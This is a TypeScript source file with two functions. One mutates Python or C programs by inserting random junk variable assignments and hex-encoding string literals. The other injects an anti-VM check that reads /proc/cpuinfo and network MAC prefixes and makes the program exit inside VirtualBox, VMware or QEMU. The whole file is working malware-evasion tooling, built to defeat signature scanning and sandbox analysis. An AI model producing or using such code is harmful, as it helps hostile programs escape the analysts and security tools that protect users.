import crypto from "node:crypto";

export async function mutateSourceCode(
  source: string,
  language: string,
): Promise<string> {
  const lines = source.split("\n");
  const mutatedLines = lines.map((line) => {
    if (crypto.randomInt(100) > 70) {
      const junkVar = `_0x${crypto.randomBytes(2).toString("hex")}`;
      const junkVal = crypto.randomInt(1000);
      const junkOp =
        language === "python"
          ? `${junkVar} = ${junkVal} # shadow-op`
          : `volatile int ${junkVar} = ${junkVal}; // shadow-op`;
      return `${junkOp}\n${line}`;
    }
    if (line.includes('"') || line.includes("'")) {
      return line.replace(/"([^"]+)"/g, (match, p1) => {
        if (language === "python") {
          const hex = Buffer.from(p1).toString("hex");
          return `bytes.fromhex('${hex}').decode()`;
        } else {
          const chars = p1
            .split("")
            .map((c: string) => `'\\x${c.charCodeAt(0).toString(16)}'`)
            .join(", ");
          return `(char[]){${chars}, 0}`;
        }
      });
    }
    return line;
  });
  return mutatedLines.join("\n");
}

export function injectAntiVM(source: string, language: string = "c"): string {
  const antiVM_C = `
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int check_vm() {
    FILE *fp;
    char buffer[1024];
    int score = 0;
    fp = popen("grep -E 'hypervisor|vmware|qemu' /proc/cpuinfo", "r");
    if (fgets(buffer, sizeof(buffer), fp) != NULL) score += 50;
    pclose(fp);
    fp = popen("cat /sys/class/net/*/address", "r");
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        if (strncmp(buffer, "08:00:27", 8) == 0) score += 30;
        if (strncmp(buffer, "00:05:69", 8) == 0) score += 30;
    }
    pclose(fp);
    return (score >= 50);
}
`;
  const antiVM_Python = `
import os
import subprocess
def check_vm():
    score = 0
    try:
        cpu_info = subprocess.check_output("grep -E 'hypervisor|vmware|qemu' /proc/cpuinfo", shell=True).decode()
        if cpu_info: score += 50
        for interface in os.listdir('/sys/class/net/'):
            with open(f'/sys/class/net/{interface}/address', 'r') as f:
                mac = f.read().strip()
                if mac.startswith(("08:00:27", "00:05:69")): score += 30
    except:
        pass
    return score >= 50
`;
  if (language === "python") {
    return `${antiVM_Python}\nif check_vm(): exit(0)\n${source}`;
  } else {
    return `${antiVM_C}\n${source.replace(/main\s*\([^)]*\)\s*{/, "main() {\n    if (check_vm()) exit(0);")}`;
  }
}
